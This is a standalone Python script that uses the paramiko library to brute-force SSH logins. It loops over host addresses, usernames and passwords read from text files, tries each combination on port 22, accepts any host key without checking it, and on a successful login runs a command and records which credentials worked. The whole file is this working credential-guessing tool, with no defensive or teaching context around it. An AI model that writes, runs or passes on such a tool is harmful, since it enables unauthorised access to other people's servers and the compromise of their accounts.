import paramiko

with open('ip.txt', 'r') as ip_file, open('output.txt', 'w') as output_file:
    for hostname in ip_file:
        hostname = hostname.strip()
        with open('user.txt', 'r') as user_file:
            for username in user_file:
                username = username.strip()
                with open('pass.txt', 'r') as pass_file:
                    for password in pass_file:
                        password = password.strip()
                        output_file.write(f"Trying {username}:{password}@{hostname}...\n")
                        print(f"Trying {username}:{password}@{hostname}...")
                        try:
                            # create SSH client object
                            ssh = paramiko.SSHClient()

                            # automatically add host key
                            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

                            # connect to SSH server
                            ssh.connect(hostname, port=22, username=username, password=password)

                            # send 'hello' message
                            stdin, stdout, stderr = ssh.exec_command('echo "hello"')

                            # print output
                            response = stdout.read().decode()
                            output_file.write(f"Response from {hostname} ({username}): {response}\n")
                            print(f"Response from {hostname} ({username}): {response}")

                            # close SSH connection
                            ssh.close()

                        except paramiko.AuthenticationException:
                            output_file.write(f"Failed to authenticate with {username}:{password}@{hostname}\n")
                            print(f"Failed to authenticate with {username}:{password}@{hostname}")

                        except Exception as e:
                            output_file.write(f"Error connecting to {hostname} ({username}): {e}\n")
                            print(f"Error connecting to {hostname} ({username}): {e}")
                        output_file.write('\n')
                        print()
